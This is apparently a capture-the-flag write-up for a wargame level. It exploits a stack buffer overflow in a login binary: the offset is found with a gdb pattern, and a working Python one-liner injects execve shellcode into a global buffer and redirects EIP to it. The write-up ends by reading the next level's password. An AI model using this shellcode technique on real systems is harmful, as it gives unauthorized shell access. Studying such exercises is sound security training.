# Level01

No call to `bin/sh` in this binary and `NX` is disabled, it seems we will have to use **shellcode**.		

This program asks for a username and a password with `fgets()`.		
```c
fgets(obj.a_user_name, 0x100, 0)	# fgets from stdin to a global variable string with sufficient space
fgets(buffer, 0x64, 0)			# fgets from stdin to a local buffer of size 100
```

The first `fgets()` is farily secure, and its first 7 characters are compared to the string "dat_wil" in `verify_user_name()` to continue the process.		

In the case of the second `fgets()` however, we can see that it uses a stack buffer and that its size parameter is bigger than the available space in the stack frame. We can perform a **buffer overflow attack** here and redirect to some **shellcode**.

Using a buffer overflow pattern and `gdb` we can easily locate the offset and `EIP save` (https://wiremask.eu/tools/buffer-overflow-pattern-generator/).		

```bash
(gdb) r
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
offset: 80		

Since we have the space, we can even place our **shellcode** inside the first buffer after "dat_will" and replace the `EIP save` with its address.		
This first buffer's address is `0x0804a040`, we just have to add 7 to account for the username string and we will havethe address for our **shellcode**.

```bash
python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac' + '\x08\x04\xa0\x47'[::-1]" > /tmp/inj01

cat /tmp/inj01 - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
